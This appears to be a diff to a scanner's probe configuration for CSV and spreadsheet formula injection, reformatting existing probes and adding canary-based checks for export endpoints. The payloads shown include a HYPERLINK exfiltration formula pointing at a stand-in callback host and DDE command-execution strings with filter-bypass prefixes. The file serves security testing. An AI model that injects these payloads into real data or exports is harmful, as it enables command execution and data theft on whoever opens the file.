@@ -4,13 +4,28 @@
     "formula_injection": {
       "description": "CSV/spreadsheet formula injection -- inject formulas into exported CSV/XLSX data that execute when opened in Excel/Google Sheets",
       "tech_match": [],
-      "param_match": ["name", "title", "description", "comment", "note", "address", "company", "bio", "message", "email", "username"],
+      "param_match": [
+        "name",
+        "title",
+        "description",
+        "comment",
+        "note",
+        "address",
+        "company",
+        "bio",
+        "message",
+        "email",
+        "username"
+      ],
       "probes": [
         {
           "payload": "=1+1",
           "description": "Basic formula probe -- if exported CSV contains =1+1 and opens in Excel, cell shows 2 instead of literal text",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "medium",
           "confidence_boost": 35
@@ -19,7 +34,10 @@
           "payload": "=HYPERLINK(\"https://COLLABORATOR/?csv-exfil\",\"Click here\")",
           "description": "HYPERLINK formula -- creates clickable link in Excel that sends callback when clicked. Data exfil via URL parameters.",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "medium",
           "confidence_boost": 40
@@ -28,7 +46,10 @@
           "payload": "=cmd|'/C calc.exe'!A1",
           "description": "DDE command execution (legacy Excel) -- Dynamic Data Exchange launches external command. Blocked in modern Excel by default but works on unpatched systems.",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 45
@@ -37,7 +58,10 @@
           "payload": "-1+1+cmd|'/C calc'!A0",
           "description": "DDE with leading minus -- bypasses some input filters that only check for = prefix",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 40
@@ -46,12 +70,92 @@
           "payload": "@SUM(1+1)*cmd|'/C calc'!A0",
           "description": "DDE with @ prefix -- alternative formula trigger character that bypasses = prefix filters",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 40
         }
       ]
+    },
+    "csv_export_formula_reflection": {
+      "description": "CSV/Excel export endpoint reflects formula payload literally (=1+1 / HYPERLINK / DDE) — opening the export in Excel evaluates the formula. Fires on responses with spreadsheet Content-Type and the literal formula prefix reflected.",
+      "tech_match": [],
+      "param_match": [
+        "name",
+        "title",
+        "description",
+        "comment",
+        "note",
+        "company",
+        "message",
+        "filename"
+      ],
+      "probes": [
+        {
+          "payload": "=praetor-csv-{{randstr}}",
+          "description": "Inject canary formula prefix; backend export response containing literal =praetor-csv- text confirms unsanitised reflection into CSV.",
+          "matchers": [
+            {
+              "type": "header",
+              "name": "Content-Type",
+              "contains": "csv"
+            },
+            {
+              "type": "reflection",
+              "marker": "=praetor-csv-"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {
+            "manual_chain": true
+          }
+        },
+        {
+          "payload": "@praetor-csv-{{randstr}}",
+          "description": "@ prefix bypass — same canary but @ instead of =. Some filters strip leading = only.",
+          "matchers": [
+            {
+              "type": "header",
+              "name": "Content-Type",
+              "contains": "csv"
+            },
+            {
+              "type": "reflection",
+              "marker": "@praetor-csv-"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {
+            "manual_chain": true
+          }
+        },
+        {
+          "payload": "=praetor-xlsx-{{randstr}}",
+          "description": "XLSX export variant — Content-Type may be application/vnd.openxmlformats / application/vnd.ms-excel.",
+          "matchers": [
+            {
+              "type": "header",
+              "name": "Content-Type",
+              "contains": "spreadsheet"
+            },
+            {
+              "type": "reflection",
+              "marker": "=praetor-xlsx-"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {
+            "manual_chain": true
+          }
+        }
+      ]
     }
-  }
+  },
+  "description": "CSV/spreadsheet formula injection on export endpoints. Active in W12: csv_export_formula_reflection fires on responses with csv/spreadsheet Content-Type + literal formula prefix reflection. Existing contexts (formula_injection) remain as operator-driven payload guidance."
 }
